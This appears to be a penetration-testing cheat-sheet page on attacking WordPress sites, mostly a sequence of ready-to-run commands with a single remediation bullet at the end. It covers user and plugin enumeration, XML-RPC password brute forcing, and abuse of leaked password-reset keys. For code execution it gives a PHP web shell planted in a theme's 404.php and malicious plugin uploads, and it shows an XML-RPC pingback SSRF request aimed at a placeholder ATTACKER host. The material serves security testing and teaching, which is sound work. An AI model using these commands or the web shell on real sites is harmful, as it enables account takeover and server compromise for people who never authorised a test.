---
tags:
  - Web
---

# :material-wordpress: WordPress

<span class="pill pill-medium">very common</span> <span class="pill pill-info">web</span>

WordPress core is usually solid — **the plugins and themes are the hole**. ~60% of
the web runs it, and most compromises come from one outdated plugin.

!!! abstract "TL;DR"
    `wpscan` to enumerate version + plugins + users → find the weakest plugin's CVE
    → or brute a user via XML-RPC → admin → PHP theme editor = RCE.

## :material-magnify: Enumerate

```bash
wpscan --url https://$TARGET --enumerate ap,at,u --api-token $WPSCAN_TOKEN
#   ap = all plugins   at = all themes   u = users
wpprobe scan -u https://$TARGET/ --mode hybrid       # fast plugin/version probe

# manual fingerprints
curl -s https://$TARGET/ | grep -oE 'wp-content/plugins/[^/]+'   # installed plugins
curl -s https://$TARGET/wp-json/wp/v2/users                      # user enum via REST
curl -s https://$TARGET/?rest_route=/wp/v2/users
curl -s https://$TARGET/readme.html | grep -i version            # core version
```

!!! loot "User enumeration is trivial"
    `/wp-json/wp/v2/users`, `?author=1` redirects, and login error differences all
    leak valid usernames → feed [Password Spraying](../network/password-spraying.md).

## :material-key: Brute force & auth

```bash
# XML-RPC amplifies brute force (many creds per request) — much faster than wp-login
wpscan --url https://$TARGET -U users.txt -P rockyou.txt
# system.multicall to test hundreds of passwords in one POST to /xmlrpc.php
```

!!! bug "SQLi in a plugin but the hashes won't crack?"
    Don't crack — **reset**. Request a password reset, then use the leaked
    activation key: `/wp-login.php?action=rp&key=<KEY>&login=<USER>`.

## :material-fire: Admin → RCE

Once you're admin, code execution is built in:

```text
# 1) Appearance → Theme Editor → edit 404.php → <?php system($_GET['c']); ?>
#    then hit /wp-content/themes/<theme>/404.php?c=id
# 2) Upload a malicious plugin (zip with PHP) → Plugins → Add New → Upload
# 3) msfvenom PHP payload dropped via the media/upload flow
```

```bash
# XML-RPC pingback → SSRF / port-scan the internal network
curl -s https://$TARGET/xmlrpc.php -d \
'<methodCall><methodName>pingback.ping</methodName><params>
<param><value>http://ATTACKER/</value></param>
<param><value>https://'"$TARGET"'/?p=1</value></param></params></methodCall>'
```

## :material-shield-check: Remediation

- Patch/remove unused plugins & themes; run a WAF; disable `xmlrpc.php` and REST
  user enumeration; enforce 2FA and strong admin passwords.

## :material-link-variant: Related

- Fingerprinted at [Web Technologies](index.md) / [Ports](../network/ports.md).
- Admin theme-editor RCE → [Linux Privesc](../privesc/linux.md); pingback → [SSRF](../web/ssrf.md).
- Reference: [WPScan](https://github.com/wpscanteam/wpscan), [HackTricks WordPress](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/wordpress.html).
